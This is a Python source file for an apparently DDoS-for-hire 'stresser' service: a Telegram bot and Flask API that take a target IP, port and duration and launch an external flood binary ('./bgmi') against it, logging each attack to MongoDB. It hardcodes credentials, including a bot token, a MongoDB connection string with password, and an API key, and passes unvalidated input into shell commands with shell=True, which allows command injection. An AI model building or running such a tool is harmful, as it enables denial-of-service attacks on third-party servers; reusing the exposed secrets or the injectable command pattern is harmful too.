import asyncio
import logging
import subprocess
import threading
import os
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, filters, ContextTypes
from pymongo import MongoClient
import uuid
from dotenv import load_dotenv

# --- FLASK API SETUP ---
api_app = Flask(__name__)

# --- CONFIGURATION (Integrated from your details) ---
BOT_TOKEN = "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o"
MONGODB_URI = "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev"
DATABASE_NAME = "sastadev"
API_URL = "https://api.battle-destroyer.shop"
API_KEY = "ak_e09b114844018935feffc"
ADMIN_IDS = [8787952549]

# Logging Setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure Binary Permissions
if os.path.exists("./bgmi"):
    os.system("chmod +x bgmi")

# MongoDB Setup
try:
    client = MongoClient(MONGODB_URI)
    db = client[DATABASE_NAME]
    users_col = db.users
    attacks_col = db.attacks
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ MongoDB Error: {e}")

# --- API ENDPOINT FOR YOUR APP ---
@api_app.route('/api/launch', methods=['POST'])
def api_launch():
    data = request.json
    received_key = request.headers.get("x-api-key")
    
    # Auth Check
    if received_key != API_KEY:
        return jsonify({"success": False, "error": "Unauthorized Access"}), 403

    target = data.get('ip')
    port = data.get('port')
    duration = data.get('duration')

    if not target or not port or not duration:
        return jsonify({"success": False, "error": "Missing target, port or time"}), 400

    try:
        # Launching the attack using your binary
        cmd = f"./bgmi {target} {port} {duration} 64"
        subprocess.Popen(cmd, shell=True)
        
        # Log to DB for App Tracking
        attacks_col.insert_one({
            "target": target,
            "port": port,
            "duration": duration,
            "source": "App Dashboard",
            "timestamp": datetime.now(timezone.utc)
        })
        
        return jsonify({"success": True, "message": f"Attack dispatched to {target}:{port}"}), 200
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# --- TELEGRAM BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Auto-register user in DB
    if not users_col.find_one({"user_id": user_id}):
        users_col.insert_one({"user_id": user_id, "joined": datetime.now()})
    
    await update.message.reply_text("💀 **SASTA DEV STRESSER ACTIVE** 💀\n\nUse /attack <ip> <port> <time>")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if Admin or Approved (Simple Check)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied! Contact @SASTA_DEVELOPER")
        return

    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = context.args[0], context.args[1], context.args[2]
    
    try:
        cmd = f"./bgmi {ip} {port} {duration} 64"
        subprocess.Popen(cmd, shell=True)
        
        attacks_col.insert_one({
            "user_id": user_id,
            "target": ip,
            "port": port,
            "duration": duration,
            "source": "Telegram",
            "timestamp": datetime.now(timezone.utc)
        })
        
        await update.message.reply_text(f"🚀 **Attack Dispatched!**\n\nTarget: `{ip}:{port}`\nTime: `{duration}s`")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# --- SERVER RUNNERS ---
def run_flask():
    # Flask port is managed by Railway
    port = int(os.environ.get("PORT", 5000))
    api_app.run(host='0.0.0.0', port=port)

def main():
    # Setup Telegram Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    
    # Start API in background
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Start Bot
    print("🚀 Bot & API Dashboard are now LIVE!")
    application.run_polling()

if __name__ == '__main__':
    main()
